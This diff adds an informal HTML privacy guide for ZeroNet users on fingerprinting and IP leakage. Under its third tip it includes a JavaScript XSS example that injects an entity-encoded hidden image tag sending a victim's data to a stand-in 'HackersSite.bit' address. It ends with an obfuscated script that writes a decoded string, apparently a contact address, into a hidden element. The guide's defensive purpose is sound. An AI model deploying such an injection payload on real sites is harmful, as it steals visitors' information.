@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Browser Fingerprinting and IP Address Detecting</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <style>
+    pre,code {
+        background-color: #DDDDDD;
+        font-family: Consolas, "Lucida Console", "Courier New", monospace;
+    }
+    div {
+        padding: 10px;
+    }
+    </style>
+</head>
+<body style="background-color: #EEEEEE">
+    <div>
+    <p>Unfortunately, ZeroNet requires Javascript.</p>
+    </div>
+
+    <b>How can I deal with such information leak?</b>
+
+    <div>
+    <p>This is not a professional guide. If you find any flaw, please report it to me via mail@zeroverse.</p>
+    <div id='i' style="display: none"></div>
+    </div>
+    <div>
+    <p>1. Use the proxy provided by Tor. -- Traffic going to clearnet sites will be sent through Tor. Their owners cannot see your IP address directly. However, your browser can be fingerprinted. Your IP address can also be leaked through WebRTC.</p>
+
+    <p>2. Use Tor Browser. -- Traffic going to clearnet sites will be sent through Tor. WebRTC is disabled by default. Browser Fingerprinting is mitigated. However, owners of linked clearnet sites can still know your system time, screen size, operating system (and Javascript performance?), using Javascript.</p>
+
+    <p>3. Use a not-working proxy. (e.g. <code>127.0.0.1:43999</code>) -- Good. You have blocked all clearnet traffic. However, XSS attack can also be performed inside the ZeroNet network.</p>
+
+<pre>
+var url = "/HackersSite.bit/?q=" + encodeURIComponent(your_info);
+var html = "&#60;&#105;&#109;&#103;&#32;&#115;&#116;&#121;&#108;&#101;&#61;&#39;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#58;&#32;&#110;&#111;&#110;&#101;&#39;&#32;&#115;&#114;&#99;&#61;&#39;&#34;&#43;&#117;&#114;&#108;&#43;&#34;&#39;&#62;&#60;&#47;&#105;&#109;&#103;&#62;";
+document.getElementById('xss').innerHTML = html;
+</pre>
+
+    <p>Queries are sent to their designated server.</p>
+
+    <p>4. Use a virtual machine. In your guest system, 1) change the screen resolution, 2) disable NTP time sync, 3) then change the timezone and screw the system clock by a few minutes. 4) Inside your virtual machine, run ZeroNet with FireFox's proxy set to a dummy address.</p>
+    </div>
+</body>
+<script>
+element = document.getElementById('i');
+element.innerHTML = atob(atob("TVRZdE1URTJMVEV6TFRFd05TMHhOVGt0T1RndE16a3RORFl0TVRjNExURXdNQzB5TlMweE1EVXRNakl0TVRFeExURTJNQzB4TVRRdE1UVXRNVEF4TFRFMkxURXlNaTB4T0RZdE5qUXRNak0xTFRFeE5pMHlOaTB4TURVdE1Ua3RPVGd0TWpjdE9UZ3RNVE10T1RjdE5TMHhNVFF0TWpjdE1URTBMVEl5TFRFd01TMHlNalV0TVRFMkxUSTFNaTA1TnkweU5UUXRNVEU1")).split('-').reverse().map(function(e){return (e>40&e<150)?String.fromCharCode(e):'';}).join('');
+</script>
+</html>
